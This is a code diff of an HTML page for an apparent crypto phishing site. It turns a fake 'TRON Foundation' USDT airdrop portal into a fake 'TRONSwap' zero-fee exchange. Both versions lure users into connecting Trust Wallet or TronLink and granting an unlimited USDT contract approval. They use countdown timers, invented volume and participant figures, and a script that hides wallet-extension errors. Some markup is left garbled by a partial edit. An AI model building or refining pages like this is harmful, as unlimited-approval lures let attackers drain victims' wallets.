@@ -3,55 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON USDT - TRC-20 에어드랍 & 권한 승인 포털</title>
+    <title>TRONSwap - USDT ↔ TRX 즉시 교환</title>
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: { 
-                extend: { 
-                    colors: { 
-                        dark: '#030712', 
-                        card: '#0b0f19', 
-                        border: '#1f293d' 
-                    } 
-                } 
-            }
-        }
-    </script>
+    <script>tailwind.config={darkMode:'class',theme:{extend:{colors:{dark:'#030712'}}}}</script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;850&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+    <script>
+        // 지갑 확장 프로그램 에러 숨김
+        window.addEventListener('error',function(e){if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}if(e.message&&(e.message.indexOf('charAt')>=0||e.message.indexOf('animation')>=0||e.message.indexOf('TokenPocket')>=0||e.message.indexOf('AccessDenied')>=0)){e.preventDefault();return true;}},true);
+        window.addEventListener('unhandledrejection',function(e){var m=e.reason?e.reason.message||String(e.reason):'';if(m.indexOf('charAt')>=0||m.indexOf('animation')>=0||m.indexOf('TokenPocket')>=0||m.indexOf('inpage')>=0){e.preventDefault();}});
+    </script>
     <style>
-        body { font-family: 'Plus Jakarta Sans', sans-serif; }
-        .font-mono { font-family: 'JetBrains Mono', monospace; }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-        .modal-backdrop { display: none; }
-        .modal-backdrop.active { display: flex; }
-        @keyframes pulse-slow { 0%,100%{opacity:.5} 50%{opacity:1} }
-        .animate-pulse-slow { animation: pulse-slow 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        .glass-panel { background: linear-gradient(135deg, rgba(15, 23, 42, 0.7) 0%, rgba(7, 11, 20, 0.8) 100%); backdrop-filter: blur(20px); }
+        body{font-family:'Plus Jakarta Sans',sans-serif}
+        .font-mono{font-family:'JetBrains Mono',monospace}
+        .glass{background:linear-gradient(135deg,rgba(15,23,42,0.7),rgba(7,11,20,0.85));backdrop-filter:blur(20px)}
+        .modal-backdrop{display:none}.modal-backdrop.active{display:flex}
+        @keyframes pulse-slow{0%,100%{opacity:.5}50%{opacity:1}}.animate-pulse-slow{animation:pulse-slow 2.5s ease-in-out infinite}
+        .wallet-card{transition:all 0.2s}.wallet-card:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}.wallet-card:active{transform:scale(0.98)}
+        .no-scrollbar::-webkit-scrollbar{display:none}.no-scrollbar{-ms-overflow-style:none;scrollbar-width:none}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}.fade-in{animation:fadeIn 0.3s ease-out}
+        @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}.shimmer{background:linear-gradient(90deg,transparent 25%,rgba(255,255,255,0.05) 50%,transparent 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}
+        .step-progress{position:relative;overflow:hidden}.step-progress::after{content:'';position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,#3b82f6,#06b6d4);width:0;transition:width 0.6s ease}.step-done::after{width:100%}
     </style>
 </head>
 <body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-blue-600 selection:text-white">
 
-    <!-- Ambient Background Glows -->
-    <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-blue-600/10 via-sky-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
-    <div class="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-cyan-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
-
-    <!-- Toast Container -->
+    <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-blue-600/8 via-cyan-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
+    <div class="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
 
-    <!-- Live Ticker Bar -->
+    <!-- Ticker -->
     <div class="bg-[#050811] border-b border-slate-800/60 py-2 px-4 text-xs font-mono">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-4">
-            <div class="flex items-center gap-2.5 text-blue-400 shrink-0 font-medium">
-                <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span></span>
-                <span>실시간 에어드랍 현황</span>
-            </div>
+            <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium"><span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span></span><span data-i18n="ticker_label">실시간 교환 현황</span></div>
             <div id="ticker-container" class="flex items-center gap-6 overflow-x-auto whitespace-nowrap no-scrollbar py-0.5 text-slate-400 text-[11px]"></div>
         </div>
     </div>
@@ -60,349 +47,431 @@
     <header class="border-b border-slate-800/80 bg-[#050811]/90 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3.5">
-                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shadow-inner text-blue-400">
-                    <i class="fa-solid fa-shield-halved text-base"></i>
-                </div>
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shadow-inner text-blue-400"><i class="fa-solid fa-arrow-right-arrow-left text-base"></i></div>
                 <div>
-                    <div class="flex items-center gap-2.5">
-                        <h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON USDT <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Portal</span></h1>
-                        <span class="text-[10px] px-2 py-0.5 rounded-full font-mono font-bold bg-blue-500/10 text-blue-400 border border-blue-500/20">TRC-20</span>
-                    </div>
-                    <p class="text-[11px] text-slate-400 hidden sm:block">공식 TRC-20 온체인 스페셜 에어드랍 & 권한 승인 포털</p>
+                    <div class="flex items-center gap-2.5"><h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON<span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Swap</span></h1><span class="text-[11px] px-2 py-0.5 rounded-full font-mono font-bold bg-blue-500/10 text-blue-400 border border-blue-500/20">TRC-20</span></div>
+                    <p class="text-[11px] text-slate-400 hidden sm:block" data-i18n="header_sub">USDT ↔ TRX 즉시 교환 | TRC-20 메인넷</p>
                 </div>
             </div>
-            <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-blue-600 via-blue-500 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-semibold text-xs sm:text-sm px-4.5 py-2.5 rounded-xl shadow-lg shadow-blue-900/30 transition-all duration-200 border border-blue-400/30 active:scale-95">
-                <i class="fa-solid fa-wallet text-blue-200"></i><span id="wallet-btn-text">지갑 연결하기</span>
-            </button>
+            <select id="lang-select" onchange="setLang(this.value)" class="bg-slate-900 border border-slate-700 text-slate-300 text-[11px] px-2 py-2 rounded-lg focus:outline-none cursor-pointer">
+                    <option value="de">🇩🇪 Deutsch</option><option value="en">🇺🇸 English</option><option value="es">🇪🇸 Español</option><option value="fr">🇫🇷 Français</option><option value="ja">🇯🇵 日本語</option><option value="ko">🇰🇷 한국어</option><option value="ru">🇷🇺 Русский</option><option value="th">🇹🇭 ไทย</option><option value="vi">🇻🇳 Tiếng Việt</option><option value="zh">🇨🇳 中文</option>
+                </select>
+                <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-xs sm:text-sm px-4 py-2.5 rounded-xl shadow-lg shadow-blue-900/30 transition-all border border-blue-400/20 active:scale-95"><i class="fa-solid fa-wallet text-blue-200"></i><span id="wallet-btn-text" data-i18n="connect_wallet">지갑 연결</span></button>
         </div>
     </header>
 
-    <!-- Mobile DApp Modal -->
-    <div id="mobile-dapp-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh]">
-            <div class="w-16 h-16 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-2xl shadow-inner"><i class="fa-solid fa-mobile-screen-button"></i></div>
+    <!-- ===== Wallet Selector Modal ===== -->
+    <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
+        <div class="glass border border-slate-800 rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 shadow-2xl text-center relative overflow-y-auto max-h-[90vh] fade-in">
+            <div class="w-16 h-16 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-2xl shadow-inner"><i class="fa-solid fa-wallet"></i></div>
             <div class="space-y-2">
-                <h3 class="text-lg font-bold text-white">Trust Wallet 앱에서 열기</h3>
-                <p class="text-xs text-slate-400 leading-relaxed">스마트폰 일반 브라우저에서는 지갑 승인이 불가합니다.<br><strong>Trust Wallet 앱</strong>의 DApp 브라우저를 이용해 주세요.</p>
+                <h3 class="text-lg font-bold text-white" data-i18n="select_wallet" data-i18n="select_wallet">지갑을 선택하세요</h3>
+                <p class="text-xs text-slate-400 leading-relaxed"><span data-i18n-html="modal_subtitle">사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.</span></p>
             </div>
-            <div class="space-y-2.5 pt-1">
-                <button onclick="launchTrustWalletApp()" class="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-semibold py-3 rounded-xl text-xs flex items-center justify-center gap-2 shadow-lg shadow-blue-900/30 transition">
-                    <i class="fa-solid fa-arrow-up-right-from-square"></i><span>Trust Wallet 앱 열기 (URL 자동 복사됨)</span>
-                </button>
-                <!-- 안내 가이드 -->
-                <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
-                    <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i>앱에서 자동으로 안 열리면:</p>
-                    <p>1. Trust Wallet 앱을 직접 여세요</p>
-                    <p>2. 하단 <strong class="text-white">브라우저</strong> 탭 (나침반 아이콘) 클릭</p>
-                    <p>3. 상단 주소창에 <strong class="text-white">붙여넣기</strong> (URL이 이미 복사됨)</p>
-                    <p>4. <strong class="text-white">TRON 네트워크</strong>가 선택되어 있는지 확인</p>
-                </div>
-                <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-google-play text-emerald-400"></i><span>Google Play 설치</span>
-                </a>
-                <a href="https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-apple text-blue-400"></i><span>App Store 설치</span>
-                </a>
-                <button onclick="copyCurrentUrl()" class="w-full bg-slate-950/60 border border-slate-800 text-slate-400 hover:text-slate-200 py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition">
-                    <i class="fa-solid fa-copy"></i><span>링크 주소 다시 복사하기</span>
-                </button>
-                <button onclick="document.getElementById('mobile-dapp-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition">닫기</button>
+            <div class="space-y-3 pt-2">
+                <button onclick="launchTrustWallet()" class="wallet-card w-full bg-blue-900/30 hover:bg-blue-800/40 border border-blue-500/40 rounded-2xl p-4 flex items-center gap-4 text-left"><div class="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-400 text-lg"></i></div><div class="flex-1"><div class="text-sm font-bold text-white">Trust Wallet</div><div class="text-[11px] text-slate-400" data-i18n="w_trust">멀티체인 지갑</div></div><i class="fa-solid fa-chevron-right text-blue-400 text-sm"></i></button>
             </div>
+            <div class="space-y-2">
+                <a href="https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409" target="_blank" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition"><i class="fa-brands fa-apple text-blue-400"></i><span>App Store</span></a>
+                <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp" target="_blank" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition"><i class="fa-brands fa-google-play text-emerald-400"></i><span>Google Play</span></a>
+            </div><div class="text-[11px] text-slate-400" data-i18n="w_okx">OKX 거래소 지갑</div></div>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-sm"></i>
+                </button>
+            </div>
+            <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
+                <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i><span data-i18n="modal_tip_title">앱이 자동으로 안 열리면:</span></p>
+                <p data-i18n="modal_tip1">1. 선택한 지갑 앱을 직접 여세요</p>
+                <p data-i18n-html="modal_tip2">2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동</p>
+                <p data-i18n-html="modal_tip3">3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)</p>
+            </div>
+            <button onclick="document.getElementById('wallet-selector-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition" data-i18n="close_btn">닫기</button>
+        </div>
+    </div>
+
+    <!-- ===== Reward Modal ===== -->
+    <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative fade-in">
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
+            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">교환 승인 완료!</h3><p class="text-xs text-slate-300 leading-relaxed">USDT ↔ TRX 교환 권한이 승인되었습니다.<br>이제 수수료 없이 즉시 교환이 가능합니다.</p></div>
+            <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
+                <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">승인 완료</span></div>
+                <div class="flex justify-between text-slate-400"><span>교환 한도:</span><span class="text-white">무제한</span></div>
+                <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-red-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
+            </div>
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
         </div>
     </div>
 
     <!-- PC Install Modal -->
     <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center">
+        <div class="glass border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center fade-in">
             <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
-            <div class="space-y-1.5">
-                <h3 class="text-lg font-bold text-white">Trust Wallet 미감지</h3>
-                <p class="text-xs text-slate-400">브라우저 확장 프로그램 또는 앱 설치가 필요합니다.</p>
+            <div class="space-y-1.5"><h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3><p class="text-xs text-slate-400">PC에서는 Chrome 확장 프로그램이 필요합니다.<br>모바일에서는 지갑 앱의 DApp 브라우저에서 열어주세요.</p></div>
+            <div class="space-y-2.5">
+                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg"><span>TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
+                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition"><span>TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
             </div>
-            <div class="space-y-2.5 pt-2">
-                <a href="https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-blue-600 to-cyan-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg">
-                    <span>Chrome 웹스토어 다운로드</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-                <a href="https://trustwallet.com/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition">
-                    <span>Trust Wallet 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
-                </a>
-                <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 hover:text-slate-300 text-xs transition">닫기</button>
-            </div>
+            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition">닫기</button>
         </div>
     </div>
 
-    <!-- Reward Modal -->
-    <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-md p-4">
-        <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative">
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
-            <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
-            <div class="space-y-1.5">
-                <h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3>
-                <p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p>
-            </div>
-            <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
-                <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">VERIFIED ON-CHAIN</span></div>
-                <div class="flex justify-between text-slate-400"><span>승인 한도:</span><span class="text-white">무제한 (∞ USDT)</span></div>
-                <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-blue-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
-            </div>
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
-        </div>
-    </div>
-
-    <!-- Main Content -->
     <main class="max-w-7xl mx-auto px-4 lg:px-8 py-8 space-y-8 flex-1 w-full">
 
-        <!-- Hero Banner -->
-        <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass-panel border border-slate-800/80 shadow-2xl">
+        <!-- Hero -->
+        <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass border border-slate-800/80 shadow-2xl">
             <div class="absolute top-0 right-0 w-96 h-96 bg-blue-600/10 rounded-full blur-3xl pointer-events-none"></div>
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
                 <div class="lg:col-span-7 space-y-5">
-                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold">
-                        <i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span>
-                    </div>
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">
-                        TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-sky-300 to-cyan-300">보상 에어드랍 & 권한 승인</span>
-                    </h2>
-                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">
-                        Trust Wallet 지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.
-                    </p>
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold"><i class="fa-solid fa-arrow-right-arrow-left"></i><span data-i18n="hero_badge">TRON MAINNET INSTANT SWAP</span></div>
+                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]" data-i18n="hero_title1">USDT로 TRX<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-cyan-300 to-emerald-300" data-i18n="hero_title2">즉시 교환</span></h2>
+                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl" data-i18n="hero_desc">수수료 0%로 USDT를 TRX로 즉시 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.</p>
                     <div class="pt-2 space-y-2 max-w-xl">
-                        <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400">총 보상 풀 지급 현황</span><span class="text-blue-400 font-mono">1,842,500 / 2,500,000 USDT (73.7%)</span></div>
-                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-blue-600 via-sky-400 to-cyan-400 h-full rounded-full w-[73.7%] shadow-sm"></div></div>
+                        <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400" data-i18n="today_volume">오늘 총 교환량</span><span class="text-blue-400 font-mono">842,500 USDT → 5,265,625 TRX</span></div>
+                        <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-blue-600 via-cyan-400 to-emerald-400 h-full rounded-full w-[73.7%]"></div></div>
                     </div>
                 </div>
                 <div class="lg:col-span-5 bg-[#070b14]/90 border border-slate-800/90 rounded-2xl p-6 backdrop-blur-xl shadow-2xl flex flex-col items-center text-center">
-                    <div class="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider mb-4"><i class="fa-regular fa-clock text-blue-400"></i><span>이벤트 마감 임박</span></div>
+                    <div class="flex items-center gap-2 text-xs font-semibold text-slate-400 uppercase tracking-wider mb-4"><i class="fa-regular fa-clock text-blue-400"></i><span data-i18n="free_event">수수료 무료 이벤트</span></div>
                     <div class="grid grid-cols-4 gap-2.5 w-full max-w-xs">
-                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-days" class="text-xl sm:text-2xl font-black font-mono text-blue-400">02</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">DAYS</div></div>
-                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-hours" class="text-xl sm:text-2xl font-black font-mono text-white">18</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">HOURS</div></div>
-                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-mins" class="text-xl sm:text-2xl font-black font-mono text-white">41</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">MINS</div></div>
-                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-secs" class="text-xl sm:text-2xl font-black font-mono text-emerald-400">20</div><div class="text-[9px] text-slate-500 mt-1 font-semibold">SECS</div></div>
+                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-days" class="text-xl sm:text-2xl font-black font-mono text-blue-400">02</div><div class="text-[10px] text-slate-500 mt-1 font-semibold">DAYS</div></div>
+                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-hours" class="text-xl sm:text-2xl font-black font-mono text-white">18</div><div class="text-[10px] text-slate-500 mt-1 font-semibold">HOURS</div></div>
+                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-mins" class="text-xl sm:text-2xl font-black font-mono text-white">41</div><div class="text-[10px] text-slate-500 mt-1 font-semibold">MINS</div></div>
+                        <div class="bg-slate-900/80 border border-slate-800 p-2.5 rounded-xl"><div id="cd-secs" class="text-xl sm:text-2xl font-black font-mono text-emerald-400">20</div><div class="text-[10px] text-slate-500 mt-1 font-semibold">SECS</div></div>
                     </div>
                     <div class="mt-5 pt-4 border-t border-slate-800/80 w-full flex items-center justify-around text-xs text-slate-400 font-mono">
-                        <div><span class="block text-slate-500 text-[10px]">참여자 수</span><span class="text-slate-200 font-bold">18,492 명</span></div>
+                        <div><span class="block text-slate-500 text-[11px]" data-i18n="swap_count">교환 건수</span><span class="text-slate-200 font-bold" data-i18n="swap_count_val">18,492 건</span></div>
                         <div class="h-6 w-px bg-slate-800"></div>
-                        <div><span class="block text-slate-500 text-[10px]">평균 수령액</span><span class="text-emerald-400 font-bold">280 USDT</span></div>
+                        <div><span class="block text-slate-500 text-[11px]" data-i18n="avg_amount">평균 교환액</span><span class="text-emerald-400 font-bold">280 USDT</span></div>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Steps Section -->
-        <section class="glass-panel border border-slate-800/80 rounded-2xl p-6">
-            <h3 class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-5 text-center">참여 진행 단계</h3>
+        
+        <!-- Swap Card -->
+        <section class="max-w-xl mx-auto w-full">
+            <div class="glass border border-slate-800/90 rounded-3xl p-6 sm:p-8 shadow-2xl">
+                <div class="flex items-center justify-between pb-4 mb-5 border-b border-slate-800/80">
+                    <div class="flex items-center gap-3"><div class="w-11 h-11 bg-blue-500/10 text-blue-400 rounded-xl border border-blue-500/20 flex items-center justify-center"><i class="fa-solid fa-arrow-right-arrow-left text-lg"></i></div><div><h3 class="text-base sm:text-lg font-bold text-white" data-i18n="swap_title">USDT → TRX 교환</h3><p class="text-xs text-slate-400" data-i18n="swap_sub">TRC-20 즉시 스왑</p></div></div>
+                    <span id="allowance-badge-main" class="text-xs px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400 animate-pulse-slow" data-i18n="approval_needed">교환 승인 필요</span>
+                </div>
+                <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-5 space-y-3 mb-3">
+                    <div class="flex items-center justify-between text-sm text-slate-400"><span data-i18n="send_amount">보내는 금액 (USDT)</span><span ><span data-i18n="bal">잔액</span>: <span id="usdt-bal-swap" class="text-emerald-400 font-bold font-mono">0.00</span></span></div>
